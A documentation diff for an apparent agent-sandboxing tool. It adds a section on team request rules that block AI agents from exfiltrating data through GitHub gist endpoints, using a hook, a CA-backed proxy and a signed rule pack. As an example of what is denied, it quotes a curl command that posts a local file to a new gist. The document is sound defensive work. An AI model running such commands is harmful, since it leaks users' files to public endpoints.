@@ -584,6 +584,49 @@ A file that is missing, that this user cannot read (the agent, running as the sa
 user, cannot read it either) or that does not parse says nothing. Codex settings an MDM
 profile delivers on macOS are not read.
 
+## Teams: request rules for allowed hosts
+
+The hosts the default policy allows (GitHub, the package registries) can receive data
+through endpoints that publish what they are sent, such as a new gist. Request rules
+(`requests:`, [POLICY.md](POLICY.md) §2.3, ADR-062) name those endpoints per host. There
+are three levels, and a team picks how far to go:
+
+1. **The hook, on by default.** The default policy's `exfil-gists` entry is `hook_only`:
+   the hook denies `curl -X POST https://api.github.com/gists -d @notes.txt`, `gh gist
+   create` and the other spellings it reads, and holds for review a request whose URL is
+   made at run time. It needs no setup and no CA, for every agent with a hook. A
+   repository policy can add more entries (deny lists only) for everyone in the project.
+2. **The proxy, with a CA.** An entry without `hook_only` is also held inside HTTPS, for
+   every client and script, by `openmoat run`'s proxy and, with `sandbox.proxy_port`,
+   by `openmoat proxy` for the Claude Code sessions it gives the CA. Each person makes
+   the CA once, at a terminal, and again whenever a host is added:
+
+   ```bash
+   openmoat proxy ca init
+   ```
+
+   Without a CA that covers the host, `openmoat run` does not start, and `openmoat
+   proxy` refuses the host's connections (`requests_untrusted: refuse`, the default;
+   `relay` passes them unread). Codex's sandbox sessions cannot be given the CA, so
+   under `openmoat proxy` they are refused for such hosts; inside `openmoat run` they
+   are held like any other.
+3. **The pack, to hold the default rules at the proxy.** The `exfil-endpoints` pack
+   (`crates/openmoat-core/policies/packs/exfil-endpoints.yaml` in the source) lists the
+   same denies without `hook_only`. Whoever maintains the team's rules signs it, and each
+   person installs it after the CA:
+
+   ```bash
+   ssh-keygen -Y sign -f ~/.ssh/id_ed25519 -n openmoat-pack exfil-endpoints.yaml   # the maintainer
+   openmoat policy trust-key maintainer.pub --name maintainer                       # each person, once
+   openmoat policy install exfil-endpoints.yaml
+   ```
+
+`openmoat doctor` and `openmoat status` say, where the host sandboxes use `openmoat
+proxy`, when a CA exists but the pack is not installed, and when a host a proxy-held
+entry names is not covered by the CA (run `openmoat proxy ca init` again). The rules
+narrow what an allowed host receives; they do not read request bodies, so an endpoint
+they allow (an issue comment) still carries what is put in it (THREAT_MODEL T12).
+
 ## Non-default config directories
 
 `openmoat` finds each agent's configuration the way the agent does: the variable in the
